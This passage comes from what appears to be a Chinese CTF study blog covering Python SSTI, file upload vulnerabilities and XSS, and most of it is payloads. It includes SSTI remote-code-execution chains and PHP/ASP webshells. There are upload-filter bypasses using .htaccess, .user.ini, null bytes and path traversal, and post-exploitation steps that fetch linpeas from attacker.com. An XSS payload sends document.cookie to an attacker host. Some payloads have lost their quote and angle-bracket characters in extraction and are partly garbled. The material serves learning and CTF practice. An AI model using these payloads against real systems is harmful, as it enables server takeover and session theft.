c.__init__.__globals__.values() %% if b.__class__ == .__class__ %% if eval in b.keys() % b[eval](__import__(os).popen(type flag.txt).read()) % endif %% endif %% endfor %% endif %% endfor %不常用：# 利用subprocess.Popen类进行RCE的payload.__class__.__base__.__subclasses__()[479](whoami,shell=True,stdout=-1).communicate()[0].strip()# 利用__import__导入os模块进行利用.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(os).popen(whoami).read()# 利用linecache类所属空间下可用的os模块进行RCE的payload，假设linecache为第250个子类.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[os].popen(whoami).read()[].__class__.__base__.__subclasses__()[250].__init__.func_globals[linecache].__dict__.[os].popen(whoami).read()# 利用file类（python3将file类删除了，因此只有python2可用）进行文件读[].__class__.__base__.__subclasses__()[40](etc/passwd).read()[].__class__.__base__.__subclasses__()[40](etc/passwd).readlines()# 利用file类进行文件写（python2的str类型不直接从属于属于基类，所以要两次 .__bases__）.__class__.__bases[0]__.__bases__[0].__subclasses__()[40](/tmp).write(test)# 通用getshell，都是通过__builtins__调用eval进行代码执行% for c in [].__class__.__base__.__subclasses__() %% if c.__name__==catch_warnings %c.__init__.__globals__[__builtins__].eval(__import__(os).popen(whoami).read()) % endif %% endfor %# 读写文件，通过__builtins__调用open进行文件读写% for c in [].__class__.__base__.__subclasses__() %% if c.__name__==catch_warnings % c.__init__.__globals__[__builtins__].open(filename, r).read() % endif %% endfor % 参考： Jinja用法总结 Python SSTI漏洞学习总结 SSTI模板注入(Python+Jinja2)","tags":["漏洞","SSTI"],"categories":["漏洞"]},{"title":"文件上传漏洞","path":"/2025/07/09/文件上传漏洞/","content":"文件上传漏洞 概述 什么是文件上传漏洞 文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件（木马，病毒，恶意脚本或者WebShell等）并进行执行，后获得执行服务端命令的能力。 大白话：在要上传的文件里构造语句并按照特定的方式进行上传，以达到攻击者的目的 文件上传漏洞产生原因 漏洞成因 攻击方式 示例 文件后缀名校验不严 上传 shell.php.jpg或shell.phP（大小写绕过） 绕过扩展名检查 MIME 类型校验不严 修改 Content-Type: image/png 伪造 MIME 类型 解析漏洞 shell.php/ shell.asp;.jpg Nginx/IIS 解析漏洞 目录可执行 上传 shell.php 访问 uploads/shell.php 直接访问 Webshell 过滤不足 shell.php%00.jpg GIF89a 伪造文件 权限配置问题 服务器允许执行上传文件 提权或远程控制 高危触发点 相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以上传附件的地方或有文件管理功能的地方 限制措施及绕过 前端检测 前端检测主要是通过JavaScript语句 判断 前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证失败，则不会发出这项网络请求（不会发包）;可以在浏览器的网络元素中查看是否发出了网络请求 绕过 改变前端 删除JS F12修改source的JavaScript代码，直接删除关于文件上传时验证上传文件相关代码 禁用JS 直接在F12的设置中禁用JavaScript 骗过前端 上传符合要求的文件类型，抓包修改文件类型 如文件名是name.png，在bp抓包后改成name.php 注：只有前端通过后才能发包，bp这时才能抓包 解析漏洞 .htaccess文件解析漏洞 基础 原理 .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过.htaccess可以做到：重写解析规则(如：将png文件作为php来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等 利用前提 使用Apache 服务器（ 不适用于Nginx 服务器） 能成功上传.htaccess文件的上传，且没有被重命名 利用方式 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。 绕过 先命名成a.htaccess，bp抓包改成.htaccess即可，内容为： AddType application/x-httpd-php .jpg //让 .jpg 文件被解析为 PHP 再写个木马，改名为shell.jpg，内容为： ?php system($_GET[cmd]); ? 此时jpg文件会按照php文件被解析，也就是shell.jpg被当成php文件执行，然后开蚁剑/直接访问shell.jpg执行命令 http://example.com/uploads/shell.jpg?cmd=whoami 模板 #对于phpAddType application/x-httpd-php .html #将html文件作为php文件进行解析#对于pythonAddHandler cgi-script .py #将html文件作为php文件进行解析Options +ExecCGI #对于PerlAddHandler cgi-script .cgi .plOptions +ExecCGI Apache解析漏洞 基础 原理 Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就在往左判断 如test.php.a.b的.a和.b这两种后缀是apache不可识别解析，apache就会把test.php.a.b解析成test.php 大白话：后缀可以是其他的，只要文件名里有.php，就按照PHP文件执行也可以使用.php\\x0a（\\x0a 为换行符，apache解析时会把其当作分隔符）来过一些服务器的安全策略 IIS6.0/IIS5.x解析漏洞 文件解析漏洞 上传文件名：xxx.asp;.jpg 服务器默认不解析;号后面的内容，因此xxx.asp;.jpg被当做asp文件解析 一般步骤：写并传马 - 抓包 - 修改上传路径 - 蚁剑 目录解析漏洞 向xxx.asp目录下面上传xxx.jpg 服务器会将xxx.asp命名的文件夹里的文件都当做asp文件解析 注：IIS6.0 默认的可执行文件除了asp还包含这三种.asa .cer .cdx 一般步骤：写并传马 - 抓包 - 改文件名 - 蚁剑 asp一句话木马(注意文件后缀是asp) %eval request(admin)% 文件上传之IIS6.0解析漏洞_iis6解析漏洞利用-CSDN博客 IIS7.0 | IIS7.5 | Nginx的解析漏洞 原理 Nginx拿到文件路径（URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied 这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理 如当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推 简单来说，文件我们可以在存在的文件路径后面加一个虚假的/name.php，这个存在的文件如果是一个图片马，就可能实现getshell 漏洞形式 www.xxxxx.com/UploadFiles/image/1.jpg/1.php www.xxxxx.com/UploadFiles/image/1.jpg%00.php www.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php .user.ini文件包含漏洞 基础 原理 .user.ini是一个可以由用户“自定义”的php.ini（php.ini是php的一个全局配置文件，对整个web服务起作用，但.user.ini仅对当前目录及子目录有效），我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。 我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马 使用前提 能成功上传.user.ini文件的上传，且没有被重命名 此目录下已有一个任意的.php文件 模板 auto_prepend_file = filename //将指定文件包含在该目录中所有php脚本的文件头部auto_append_file = filename //将指定文件包含在该目录中所有php脚本的文件尾部 利用 先上传a.user.ini.jpg文件，内容： GIF89a //绕过exif_imagetype()auto_prepend_file=test1.png //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行auto_append_file=test1.png //解析后进行包含，它包含在所有php文件执行后执行 bp抓包改名为.user.ini 再上传test1.png，没必要改名，其内容会被当做PHP文件内容执行。 这句话：auto_prepend_file表示在php程序加载第一个php代码前加载的php文件 我们要先找到一个php文件，自己传会被Unicode化，那看看是否有原有的： url/upload/index.php 蚁剑连 [SUCTF 2019]CheckIn 数字后缀绕过 PHP 文件的标准后缀始终是 .php，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者/系统中，使用.php3 、.php5 、.php7 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置.php7 等后缀可被PHP解释器解析 利用 Apache 的配置文件或目录下的.htaccess 文件有添加设置，如.php7可被解析的配置为： AddHandler application/x-httpd-php .php7 后端检测_文件头检测漏洞 基础 原理 在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测 常见文件头 GIF： 16进制模式：47 49 46 38 39 61 对应文本： GIF89a png： 16进制模式：89 50 4E 47 0D 0A 1A 0A 对应文本： ‰PNG JPG： 16进制模式：FF D8 FF E0 00 10 4A 46 49 46 对应文本： ÿØÿà 在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的 注：最好文件头和代码（木马）之间有个空格 某些情况下，后端可能还会检测文件拓展名，此时需要结合解析漏洞或者文件包含才能实现执行木马 后端检测_00截断 基础 虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测 利用条件 php版本要小于5.3.4，5.3.4及以上已经修复该问题 PHP的magic_quotes_gpc为OFF状态 用户可指定上传路径 绕过 %00经过URL解码后就是0x00，二者的意思都是空字符，表示一个字符串的结束。无论00后存在任何内容文本(或后端直接对00字符串进行拼接其他字符串)，00后的内容都会被截断，最后字符串留下00前的内容且不包括00 我们就可以根据源码利用%00实现.php后缀 GET传参保存路径 后端对文件路径的处理类似为 $des = $_GET[road] . /对文件名的处理操作...... . $ext; 此时road为我们可控的参数，可直接进行使用%00截断 由于使用00截断，所以最后文件保存在/var/www/html/upload,名为shell.php,根据位置，访问/upload/shell.php,即进入我们所在的页面 POST传参保存路径 与GET传参类似的的是：后端对文件路径的处理类似为 $des = $_POST[road] . /对文件名的处理操作...... . $ext; 此时road为我们可控的参数，但与GET传参不同的是，http请求内包含文件时，POST参数不再被自动解码，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为00 步骤一：修改路径添加文件名，写入需要执行的代码语句 步骤二：切换为十六进制模式，修改所需要替换为00的位置 由于使用00截断，所以最后文件保存在/var/www/html/upload,名为test.php,根据位置，访问/upload/test.php,即进入我们所在的页面，可以看到PHP的配置信息，00截断成功 例题 CTFHUB-技能树-WEB-文件上传-00截断 查看页面源代码发现后端的源码 if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $info = pathinfo($name); $ext = $info[extension]; $whitelist = array(jpg, png, gif); if (in_array($ext, $whitelist)) $des = $_GET[road] . / . rand(10, 99) . date(YmdHis) . . . $ext; if (move_uploaded_file($_FILES[file][tmp_name], $des)) echo scriptalert(上传成功)/script; else echo scriptalert(上传失败)/script; else echo 文件类型不匹配; 最关键的是这句代码： $des = $_GET['road'] . / . rand(10, 99) . date(YmdHis) . . . $ext; payload： ?road=/var/www/html/upload/test1.php%00 后端检测_后缀名检测漏洞 原理 通常是针对文件的扩展名后缀进行检测，主要是通过黑白名单进行过滤检测，如果不符全过滤规则则不允许上传 黑名单 一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件 绕过 解析漏洞 .htaccess文件解析漏洞- apache解析漏洞 IIS7.0 | IIS7.5 | Nginx的解析漏洞 IIS6.0解析漏洞 截断上传 截断类型:PHP%00截断 截断原理:由于00代表结束符,所以会把00后面的所有字符都截断 截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态 [!IMPORTANT] magic_quotes_gpc 全称 Magic Quotes for GET, POST, COOKIE，是 PHP 早期版本（PHP 4.0.0 至 PHP 5.4.0）提供的 自动转义 机制 自动给 $_GET、$_POST、$_COOKIE 这些全局变量中的 单引号 '、双引号 、反斜杠 \\、NULL 添加 **反斜杠 \\**进行转义，以减少 SQL 注入的风险 大小写绕过 比如：aSp和pHp之类 默认情况下，正则匹配是区分大小写的 $pattern = /\\b( . implode(|, $blacklist) . )\\b/i; // 加 i 使匹配大小写忽略 双写绕过 有时后端会把敏感字符替换为空，这就可以双写绕过了，比如name.phphpp 黑名单的漏网之鱼 asa和cer之类 asp: asa cer aspx jsp: jspx jspf php: php php3 php4 php5 phtml pht exe: exee 利用Windows的命名机制 shell.php. shell.php空格 shell.php:1.jpg shell. php::$DATA shell.php:1.jpg 在windows中，后缀名后面的点和空格都会被删除掉 注：::$DATA 是**Windows NTFS 数据流（Alternate Data Streams, ADS）**的特性，攻击者可以利用它来绕过文件上传检查，甚至执行恶意代码 shell.php:1.jpg：是一种利用 双扩展名 和 NTFS 数据流 的攻击方法，攻击者可以利用 NTFS 数据流（Alternate Data Streams, ADS） 绕过文件上传检测并执行恶意代码。 白名单 一般有个专门的 whitelist 文件，里面会包含的正常文件 绕过同黑名单 后端检测_MIME检测 基础 什么是MIME MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开 常见的MIME类型 text/plain （纯文本） text/html （HTML文档） text/javascript （js代码） application/xhtml+xml （XHTML文档） image/gif （GIF图像） image/jpeg （JPEG图像） image/png （PNG图像） video/mpeg （MPEG动画） application/octet-stream （二进制数据） application/pdf （PDF文档） 检测方式 在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件 绕过 通过抓包，将content-type字段改为常见的图片类型，从而绕过校验 如传name.php，bp抓包直接改成image/png等等 后端检测_内容检测图片马绕过 原理 一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。 本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具进行远程连接 [!IMPORTANT] getimagesize函数 getimagesize() 是 PHP 中一个非常常用的函数，用于获取图像的大小和类型信息。它不仅返回图像的尺寸（宽度和高度），还会返回图像的类型（如 JPG、PNG、GIF 等） 成功时，getimagesize() 返回一个包含以下信息的数组： 索引 描述 0 图像的宽度（整数值） 1 图像的高度（整数值） 2 图像类型（常见类型：IMAGETYPE_JPEG（2）、IMAGETYPE_PNG （3）等） 3 用于 HTML 的图像大小字符串（例如：width=300 height=200） ‘mime’ 图像的 MIME 类型（例如：image/jpeg） 图片马 cmd中 copy a.png /b + a.php /a 3.php /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件 /a:指定以ascii格式复制、合并文件用于txt等文本类文件 这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.php文件 一般解析图片马需要结合解析漏洞或者文件包含才能解析图片马 注：图片马常常与文件包含漏洞有关，一旦攻击者将包含 PHP 代码的图片文件上传到服务器，他们可以利用 文件包含漏洞 来执行图片中的 PHP 脚本 条件竞争漏洞 原理 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生 大白话：卡空子。当文件的判断需要过多的时间时，可以卡那个时间间隔执行木马 利用 上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除 由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况： 1.访问时间点在上传成功之前，没有此文件。 2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 3.访问时间点在判断之后，文件被删除，没有此文件。 二次渲染漏洞 原理 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示 绕过 配合文件包含漏洞 将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell 可以配合条件竞争 这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传 判断图片的二次处理 对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变 参考文章 超详细文件上传漏洞总结分析 文件上传入门-Pax 文件上传漏洞-Wells 通过执行系统命令找flag（绕过后） 注：cmd为上传木马传的参数 确认 Webshell 或命令执行权限 用cmd=whoami命令确认当前权限 如果返回 root，说明你有最高权限，可以直接查找 flag。 如果返回普通用户（如 www-data 或 apache），你可能需要进一步提权 查找 flag 的常见位置 flag 通常位于以下目录或文件中： /flag /root/flag /home/flag /var/www/flag /tmp/flag 当前用户的主目录（如 /home/username/flag） 可以使用以下命令查找 flag： ?cmd=find / -name flag 2/dev/null 2/dev/null：忽略权限错误（避免输出过多无用信息） 如果查找不到，在flag前后都加*来表示文件名包含 “flag” 的文件 检查当前目录 先用?cmd=ls /，再一步步查找flag 不行的话就用： ?cmd=ls -la ls -la：列出当前目录下的所有文件（包括隐藏文件） ?cmd=ls -la / 列出根目录下所有文件 如果发现可疑文件（如 flag.txt 或 .flag），可以使用 cat 命令查看内容 检查环境变量 有时 flag 可能存储在环境变量中。可以使用以下命令检查： ?cmd=env 查找输出中是否包含 FLAG 或 flag 相关的变量 检查进程或服务 如果 flag 被某个进程或服务使用，可以通过以下命令查找： ?cmd=ps aux 查找可疑进程，特别是那些可能包含 flag 的命令或参数 检查文件内容 如果 flag 被隐藏在某个文件中，可以使用 grep 命令搜索文件内容： ?cmd=grep -r flag / 2/dev/null -r：递归搜索目录。 flag：搜索包含 flag 的字符串（CTF 中 flag 通常以 flag 开头）。 /：从根目录开始搜索 检查数据库 如果目标是一个 Web 应用，flag 可能存储在数据库中。可以通过以下步骤查找： 找到数据库配置文件（如 config.php 或 .env），获取数据库凭据。 使用数据库客户端（如 mysql）连接数据库： mysql -u username -p -h localhost 查找 flag： SHOW DATABASES;USE target_database;SHOW TABLES;SELECT * FROM suspicious_table; 检查备份文件 有时 flag 可能存在于备份文件中。可以查找常见的备份文件： find / -name *.bak 2/dev/nullfind / -name *.backup 2/dev/null 检查日志文件 flag 可能被记录在日志文件中。可以检查以下日志文件： /var/log/apache2/access.log /var/log/nginx/access.log /var/log/auth.log 使用以下命令查看日志文件： cat /var/log/apache2/access.log | grep flag 提权（如果需要） 如果你当前权限不足，可以尝试提权： 1.查找具有 SUID 或 SGID 权限的文件： find / -perm -u=s -o -perm -g=s 2/dev/null 2.利用已知漏洞提权（如脏牛漏洞）： searchsploit linux kernel 3.上传提权工具（如 linpeas.sh）并运行： wget http://attacker.com/linpeas.shchmod +x linpeas.sh./linpeas.sh 读取 flag cat /path/to/flag 冬令营一些问题 学习一下eval()的用法，什么叫做将字符串作为php代码执行（留意几个问题，单双引号转义问题以及语句末尾需要分号的问题都是新手很经常碰到的） eval() 在 PHP 中的作用是将字符串作为 PHP 代码执行 eval() 常见坑 单双引号转义问题 用 \\ 处理双引号 用 \\' 处理单引号 用 addslashes() 自动转义 语句末尾必须有分号 (;) 变量替换问题 用字符串拼接 前端的过滤怎么绕过？ 禁用 JS，修改 HTML，直接构造请求 修改 MIME 类型，双写文件后缀 结合 .htaccess 让非 PHP 文件也能执行 .htaccess是做什么的，在什么服务器上（apache or nginx?）生效，使用phpstudy下载一个apache/nginx测试测试，搭建起你的web服务器测试测试 .htaccess 是 Apache Web 服务器 的目录级配置文件，用于控制访问权限、URL 重写、MIME 类型、文件执行权限等。 它 仅在 Apache 服务器上生效，在 Nginx 服务器无效（Nginx 使用 nginx.conf 进行配置） .user.ini是做什么的https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html，目录下的php文件是必须的 目录穿越导致的文件上传 目录穿越绕过方法 双写 ..// ..//..//..//../var/www/html/shell.php URL 编码绕过 ..%2F..%2F..%2F..%2Fvar/www/html/shell.php 服务器可能未对 %2F（URL 编码的 /）进行过滤，仍然解析目录穿越 双重： %252e%252e%252f%252e%252e%252fshell.php 截断绕过 ../../../shell.php%00.jpg Windows 反斜杠绕过 ..\\..\\shell.php 利用 /proc/self/cwd/ 访问目标 /proc/self/cwd/shell.php /proc/self/cwd/ 是 Linux 系统中的一个虚拟路径，代表当前进程的工作目录 访问 /proc/self/cwd/ 相当于访问 /var/www/html/ 利用环境变量绕过 /var/www/html/$IFSshell.php $IFS 是 Linux 的分隔符（通常为空格） 某些 Shell 解析时可能会错误解析路径、 防御 使用 realpath() 限制路径，禁止上传 PHP 文件，禁用 PHP 解析 .htaccess 配置 用file_put_contents()写入文件的时候，如果用unlink删除你有什么办法让文件不被删除？（tips:去看看unlink()的文档） 当使用 file_put_contents() 写入文件时，unlink() 函数可以用来删除文件。通常，unlink() 会删除文件的硬链接，如果文件是唯一的链接，那么这个文件就会被彻底删除。但是，有一些方法可以使文件在 unlink() 删除时不会被删除或被绕过删除操作 使用文件锁定（flock()） unlink() 会删除文件，但只有文件没有被其他进程锁定时才会成功。如果文件被锁定，unlink() 将无法删除该文件。你可以使用 flock() 在写入文件时锁定文件，这样就可以在某些条件下防止文件删除 使用硬链接 硬链接允许文件有多个名称指向同一数据块。在删除一个文件时，操作系统会检查该文件的引用计数，只有当所有引用都被删除时，文件才会被删除。 如果创建了硬链接，unlink() 只会删除其中一个链接，其他硬链接仍然存在，并且文件的数据不会丢失 使用符号链接 与硬链接不同，符号链接（symlink）指向的是文件路径而不是文件本身。如果你创建一个符号链接，unlink() 删除的是文件本身，不会删除符号链接所指向的文件 使用 open() 打开文件并保持文件句柄 如果你在 PHP 中使用 fopen() 或 file_get_contents() 等函数打开文件，它们会保持文件句柄（是一个指向文件的引用，用于操作文件（如读取、写入、关闭等））。即使文件被删除，只要文件句柄仍然打开，操作系统会继续保留文件内容，直到文件句柄被关闭。这是因为文件内容在句柄打开期间仍然在内存中 可解析php除了?php开头还能怎样 除了 ?php 标签外，PHP 还支持以下几种起始标签： ?（短标签）：需要开启 short_open_tag 才能工作，建议避免使用。 ?php echo 和 ?=（短回显标签）：用于直接输出内容，简写 ?= 更常用。 ?xml：适用于 XML 文件中的 PHP 代码。 php危险函数，怎么执行系统命令 eval() eval() 函数执行字符串中的 PHP 代码，虽然它不是直接执行操作系统命令，但如果攻击者能够控制字符串内容，就可以执行任意 PHP 代码，甚至是系统命令 exec() 用于执行外部程序，并返回执行结果。它可以执行任何操作系统命令 exec(ls -la); 这个代码会执行 ls -la 命令，并将结果返回 system() system() 函数类似于 exec()，但它会直接输出命令执行的结果，而不是返回结果 system(ls -la); shell_exec() shell_exec() 函数用于执行命令，并返回输出结果。与 exec() 和 system() 不同的是，shell_exec() 返回的是命令的完整输出 $output = shell_exec(ls -la);echo $output; 这个代码执行 ls -la 命令，并将结果作为字符串返回 passthru() passthru() 函数执行系统命令，并直接将命令的原始输出传递到浏览器，通常用于显示二进制数据，如图像或音频文件 passthru(ls -la); proc_open() proc_open() 函数允许启动一个外部进程，并与该进程进行交互（读写）。它比 exec() 更强大，允许与外部命令进行复杂的通信 popen() popen() 函数创建一个进程，打开一个管道到该进程的输入或输出，常用于读取命令的输出","tags":["漏洞","PHP","文件上传"],"categories":["PHP","漏洞"]},{"title":"XSS漏洞","path":"/2025/07/09/XSS漏洞/","content":"XSS漏洞 XSS是基于前端的一种攻击，其实就是非Web应用自身的JS代码被黑客恶意插入，通过执行恶意的JS代码，可以导致窃取敏感信息、篡改网页内容或劫持用户会话，大部分情况是窃取Cookie，在你登录账号后的情况下，部分Web应用通过Cookie可以导致黑客能直接登录你的账号 XSS的分类 存储型XSS 恶意脚本存储在后端中(数据库、日志文件、评论等) 持久性攻击，影响所有访问相关页面的用户 危害最大，传播范围广 不需要用户主动触发 在CTF中，利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本 反射型XSS 恶意脚本存在于URL参数中 通过HTTP请求立即执行，不存储在服务器 需要诱骗用户点击恶意链接 影响范围相对较小 在CTF中，题目会给一个输入框，然后绕过过滤，执行恶意脚本 DOM型XSS 完全在客户端执行 不涉及服务器端代码 通过JavaScript修改DOM结构触发 HTTP响应中不包含恶意脚本 JSONP型XSS 在浏览器的同源策略下，前端 JavaScript不能直接跨域请求 AJAX(一种无需刷新页面就能向服务器发送和接收数据的技术），但可以利用 script 标签(允许跨域加载特性)进行跨域请求(允许从一个域名中获取到另一个域名的数据)，从而绕过浏览器同源策略限制 后端返回的是带回调函数的 JSON 数据，前端利用回调函数callback解析数据 攻击者可以==伪造回调函数，利用 JSONP 执行任意 JavaScript 代码== 举个栗子： 假设有个接口： https://example.com/api?callback=handleData 服务器返回： handleData(name: Alice, age: 20); 攻击者构造如下 URL： https://example.com/api?callback=alert(1)// 服务器返回： alert(1)(name:Alice); 浏览器执行： alert(1)(name:Alice); 当然也可以窃取受害者的 Cookie： script src=https://example.com/api?callback=evilFunction/scriptscriptfunction evilFunction(data) document.write(img src=http://attacker.com/steal?cookie= + document.cookie + );/script XSS常见触发标签 下面这些标签常与onerror、onfocus、onclick、onmouseover、onmouseout等事件及javascript伪协议配合使用 script scriptalert(1)/script img 自闭合标签 img src=1 onerror=alert(1) img src=1 onfocus=alert(1) a a href=javascript:alert(1)/aa href= onfocus=alert(1)/a iframe iframe src=javascript:alert(1)/iframeiframe src= onfocus=alert(1)/iframe//将scriptalert(XSS)/scriptbase64编码iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=/iframe svg svg onfocus=alert(1) details //ontoggle 事件在用户打开或关闭 details 元素时触发details ontoggle=alert()/details XSS的绕过 关键词绕过 大小写绕过 sCriPtalert(1)sCriPt 拼接绕过 img src=1 onerror=eval[al+ert](1) 函数替换绕过 eval() img src=1 onerror=eval(alert(1)) open() img src=1 onerror=open(alert(1)) document.write() img src=1 onerror=document.write(alert(1)) setTimeout()和 setInterval() JavaScript 中用于延时执行代码的函数 img src=1 onerror=setTimeout(alert(1))img src=1 onerror=setInterval(alert(1)) 利用构造器 通过构造器动态生成并执行 JavaScript 代码 Set.constructor，Map.constructor，Array.constructor，WeakSet.constructor，constructor.constructor等 img src=1 onerror=Set.constructor(alert(1)) 利用数组方法 [1].map，[1].find，[1].every，[1].filter，[1].forEach，[1].findIndex等 img src=1 onerror=[1].map(alert(1)) 嵌套绕过 scscriptriptalert(XSS)/sc/scriptript 赋值绕过 img src onerror=_=alert,_(1)img src x=al y=ert onerror=top[x+y](1)img src x=al y=ert onerror=window[x+y](1) //在网页没有嵌套框架时才有效。img src onerror=top[a=al,b=ev,b+a](alert(1))img src onerror=[ale+rt].map(top[ev+al])[0][valu+eOf]()(1) 最后一个payload解释： ['ale'+'rt'] 是一个包含字符串 'alert' 的数组 map(top['ev'+'al']) 使用 map() 方法对该数组进行操作，最终将 alert 函数赋值给数组的第一个元素 [0] 取出数组的第一个元素，即 alert 函数 valueOf() 获取该函数的原始值（即 alert 函数本身） 最后，调用 alert(1) 执行 JavaScript 代码 编码绕过 URL 编码 被编码为%3C，被编码为%3E，被编码为%26，/被编码为%2F img src=1 onerror=alert(%3Cscript%3Ealert(1)%3C%2Fscript%3E) HTML 实体编码 是将某些特殊字符转换成以 开头、; 结尾的实体格式 字符 转换为 amp; lt; gt; quot; ' #039; （当 ENT_QUOTES 被设置时） nbsp; / #47; = #61; img src=1 onerror=alert(lt;scriptgt;alert(1)lt;/scriptgt;) Base64 编码 img src=1 onerror=eval(atob(YWxlcnQoMSk=)) alert(1)编码为atob('YWxlcnQoMSk=') 双重编码 例如，先对 编码为 %3C，再将%3C编码为 %253C img src=1 onerror=alert(%253Cscript%253Ealert(1)%253C%252Fscript%253E) Unicode 编码 Unicode 编码使用十六进制值表示字符，它可以用于替代常见的 ASCII 字符 img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) 97,108,101,114,116,40,49,41是 alert(1) 每个字符的 Unicode 编码值 十六进制编码 img src=1 onerror=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29)) 空格绕过 在html的标签中的不同位置的空格绕过方式不是一样的 htmlimgAAsrcAAonerrorBB=BBalertCC(1)DD/html A位置： /，/123/，%09，%0A，%0C，%0D，%20 B位置：%09，%0A，%0C，%0D，%20 C位置：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20） D位置：%09，%0A，%0C，%0D，%20，//， ()绕过 使用反引号 scriptalert`1`/script throw绕过 scriptalert;throw 1/script svg/onload=window.onerror=eval;throw=alert\\x281\\x29; onload：当 SVG 元素及其资源加载完成后触发。事件触发时会执行后面的 JavaScript 代码 window.onerror = eval;：window.onerror 是一个全局的错误处理函数，当 JavaScript 执行时发生错误，它会被调用。通过将其设置为 eval，攻击者可以劫持错误处理并执行恶意的 JavaScript 代码 throw '=alert\\x281\\x29';：这行代码通过 throw 抛出一个异常alert(1) 单引号过滤 使用反引号 用斜杠替换 scriptalert(/hack/)/script alert过滤绕过 函数替换绕过 prompt()，confirm()，console.log()，document.write() 编码绕过 对象方法绕过 利用对象的属性或方法来替代直接调用 alert img src=1 onerror=window.constructor.constructor(alert(1))() 数组方法绕过 异步调用绕过 img src=1 onerror=setTimeout(alert(1), 0) 字符替换绕过 分割关键字绕过 通过在关键字中插入空格或注释符号（ /**/）来分隔函数名 a/**/l/**/ert(1) 长度限制绕过 用拆分法 scripta=document.write(/scriptscripta=a+a href=ht/scriptscripta=a+tp://VPS-IP:po/scriptscripta=a+rthack/a)/scriptscripteval(a)/script 用嵌套结构 img src=1 onerror=document.write(img src=1 onerror=alert(1)) 分号绕过 当只过滤了分号时，可以利用花括号进行语句隔离 scriptonerror=alertthrow 1/script 当浏览器遇到 throw 1 时，它会抛出一个错误 抛出错误时，onerror 事件会被触发，因为我们之前将 onerror 设置为了 alert 函数 结果是，浏览器会弹出一个对话框，显示 1，这就是 alert(1) 的效果 绕过CSP 内容安全策略 (Content Security Policy, CSP) 